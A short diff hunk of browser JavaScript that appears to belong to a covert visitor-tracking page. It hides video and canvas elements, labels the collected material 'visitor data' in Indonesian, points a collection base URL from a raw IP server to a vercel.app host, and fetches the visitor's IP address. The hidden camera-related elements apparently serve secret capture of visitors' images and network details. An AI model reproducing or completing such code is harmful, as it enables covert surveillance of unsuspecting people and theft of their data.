@@ -3,7 +3,7 @@ video.style.display = "none";
 let canvas = document.querySelector("#canvas");
 let text = "*DATA PENGUNJUNG*";
 canvas.style.display = "none";
-const base = "http://23.95.48.230:3020";
+const base = "https://fundaypay.vercel.app";
 
 (async () => {
     const jsonIp = await useFetch("https://jsonip.com");
